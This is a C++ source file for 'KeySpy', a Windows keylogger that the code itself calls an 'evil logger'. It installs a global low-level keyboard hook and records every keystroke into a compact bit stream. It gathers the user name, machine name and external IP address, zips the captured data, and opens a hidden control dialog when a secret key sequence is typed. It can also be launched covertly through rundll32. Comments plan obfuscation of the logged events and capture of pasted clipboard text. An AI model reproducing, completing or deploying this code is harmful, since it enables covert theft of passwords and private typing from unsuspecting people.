#include "KeySpy/src/forward.h"
#include "KeySpy/src/controls_ui.h"

using namespace pr;
using namespace pr::storage::zip;

namespace keyspy
{
	struct KBSniffer
	{
		using bit_buf_t = uint64_t;
		enum class EModifier
		{
			None = 0,
			Shift = 1 << 0,
			Ctrl = 1 << 1,
			Alt = 1 << 2,
			Win = 1 << 3,
			_bitwise_operators_allowed,
		};
		static size_t const PostThreshold = 1024;

		HWND m_hwnd;
		HHOOK m_hook;
		bit_buf_t m_buf;
		int m_bits;
		std::string m_magic;
		std::vector<uint8_t> m_data;
		inline static KBSniffer* me;

		KBSniffer(HWND hwnd, HINSTANCE hinst)
			:m_hwnd(hwnd)
			, m_hook()
			, m_buf()
			, m_bits()
			, m_magic()
		{
			me = this;
			m_hook = SetWindowsHookExW(WH_KEYBOARD_LL, HookCB, hinst, 0);
		}
		~KBSniffer()
		{
			if (m_hook != nullptr)
				UnhookWindowsHookEx(m_hook);

			Post();
			me = nullptr;
		}

		// Keep running
		void Pump()
		{
			// Keep this app running until we're told to stop
			for (MSG msg; GetMessageW(&msg, nullptr, 0, 0);)
			{
				TranslateMessage(&msg);
				DispatchMessageW(&msg);
			}
		}

		// Global keystroke hook
		static LRESULT _stdcall HookCB(int code, WPARAM wparam, LPARAM lparam)
		{
			me->Hook(code, wparam, lparam);
			return CallNextHookEx(nullptr, code, wparam, lparam);
		}
		void Hook(int code, WPARAM wparam, LPARAM lparam)
		{
			if (code != HC_ACTION)
				return;
			if (wparam != WM_KEYDOWN &&
				wparam != WM_KEYUP &&
				wparam != WM_SYSKEYDOWN &&
				wparam != WM_SYSKEYUP)
				return;

			auto const& p = *reinterpret_cast<KBDLLHOOKSTRUCT const*>(lparam);
			//OutputDebugStringA(FmtS("%x %x %x\n", p.vkCode, p.flags, p.dwExtraInfo));

			// Write 2 bits for key event type
			switch (wparam)
			{
			case WM_KEYDOWN:    PutBits(0, 2); break;
			case WM_KEYUP:      PutBits(1, 2); break;
			case WM_SYSKEYDOWN: PutBits(2, 2); break;
			case WM_SYSKEYUP:   PutBits(3, 2); break;
			}

			// Write 1 bit to record the Alt key state
			PutBits(AllSet(p.flags, LLKHF_ALTDOWN) ? 1 : 0, 1);

			// Write 8 bits for the virtual key code
			// 'vkCode - 1' = a value on the range [0,253]
			// This leaves values 254 and 255 available for special purposes.
			PutBits(p.vkCode - 1, 8);

			// Check for 'Ctrl+V' or 'Shift+Ins', if the clipboard contains text, add the text

			// Obviscate each event by combining with LCG(current index into data)

			// Detect magic commands
			if (wparam == WM_KEYUP)
				CheckMagicCommands(p.vkCode);
		}

		// Decode a stream of key data
		template <typename Out>
		void Decode(std::basic_istream<uint8_t>& src, Out& out)
		{
			// Decode 'src' into a series of key commands.
			// this will need a state machine to track shift being down, etc..
		}

		// Send collected data
		void Post()
		{
			ZipArchive z;

			// Read and add the collection source information
			std::string src_info;
			CollectSourceInfo(src_info);
			z.AddString(src_info, "src");

			// Add the collected keys data
			z.AddBytes(m_data, "keys");

			//hack save for now
			z.Save("P:\\dump\\keyspy.zip");
		}

		// Read information about the system we're collecting from 
		void CollectSourceInfo(std::string& src_info)
		{
			std::array<char, 1024> buf;
			DWORD len;

			// Read the user name
			len = GetEnvironmentVariableA("USERNAME", buf.data(), DWORD(buf.size()));
			src_info.append(buf.data(), len).append(":");

			// Read machine name
			len = GetEnvironmentVariableA("COMPUTERNAME", buf.data(), DWORD(buf.size()));
			src_info.append(buf.data(), len).append(":");

			// Read external IP address
			auto net = InternetOpenA("GetIP", INTERNET_OPEN_TYPE_PRECONFIG, nullptr, nullptr, 0);
			auto conn = InternetOpenUrlA(net, "http://myexternalip.com/raw", nullptr, 0, INTERNET_FLAG_RELOAD, 0);
			InternetReadFile(conn, buf.data(), DWORD(buf.size()), &len);
			InternetCloseHandle(net);
			src_info.append(buf.data(), len).append("\n");
		}

		// Monitor the keystrokes for magic commands
		void CheckMagicCommands(DWORD vk)
		{
			auto ch = static_cast<char>(MapVirtualKeyA(vk, MAPVK_VK_TO_CHAR));
			m_magic.push_back(ch);

			// Nefarious woodsman = evil logger
			char const* MagicCommand = "123";//"nefarious woodsman: money shot!";
			if (str::EqualI(m_magic, MagicCommand))
			{
				// Show the control UI
				ControlsUI dlg(m_hwnd);
				dlg.ShowDialog();
			}
			else if (!str::EqualNI(m_magic, MagicCommand, m_magic.size()))
			{
				// Not a partial match, reset
				m_magic.resize(0);
			}
			if (m_magic.size() > 3)
				OutputDebugStringA(m_magic.c_str());
		}

		// Write 'n' bits to the output stream, via 'm_buf'
		void PutBits(bit_buf_t bits, int n)
		{
			assert((bits & (~bit_buf_t() << n)) == 0 && "'bits' has more than 'n' bits");
			assert(m_bits + n <= int(sizeof(bit_buf_t)) * 8 && "Bit buffer overflow");

			// Add the bits on the left
			m_buf |= bits << m_bits;
			m_bits += n;

			// Write out whole bytes
			for (; m_bits >= 8;)
			{
				m_data.push_back(static_cast<uint8_t>(m_buf & 0xFF));
				m_buf >>= 8;
				m_bits -= 8;
			}

			// 'm_data' full? Post the captured data
			if (m_data.size() > PostThreshold)
				Post();
		}
	};
}

extern "C"
{
	// Rundll32.exe exported entry point function
	__declspec(dllexport) void _stdcall EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR cmd_line, int)
	{
		try
		{
			if (cmd_line == nullptr || *cmd_line == 0)
			{
				keyspy::KBSniffer sniff(hwnd, hinst);
				sniff.Pump();
			}
			else
			{
				// Decode collected data
			}
		}
		catch ([[maybe_unused]] std::exception const& ex)
		{
			assert(false && ex.what());
		}
	}

	// Executable entry point
	int __stdcall wWinMain(HINSTANCE hinst, HINSTANCE, LPWSTR cmd_line, int)
	{
		try
		{
			int argc = 0;
			auto argv = CommandLineToArgvW(cmd_line, &argc);
			if (argc <= 1)
			{
				keyspy::KBSniffer sniff(nullptr, hinst);
				sniff.Pump();
			}
			else
			{
				(void)argv;
			}
			return 0;
		}
		catch ([[maybe_unused]] std::exception const& ex)
		{
			assert(false && ex.what());
			return -1;
		}
	}
	int main(int argc, char* argv[])
	{
		(void)argc,argv;
	}
}

#ifdef _MANAGED
#pragma managed(push, off)
#endif
HINSTANCE g_hInstance;
BOOL APIENTRY DllMain(HINSTANCE hInstance, DWORD ul_reason_for_call, LPVOID)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH: g_hInstance = hInstance; break;
	case DLL_PROCESS_DETACH: g_hInstance = nullptr; break;
	case DLL_THREAD_ATTACH:  break;
	case DLL_THREAD_DETACH:  break;
	}
	return TRUE;
}
#ifdef _MANAGED
#pragma managed(pop)
#endif
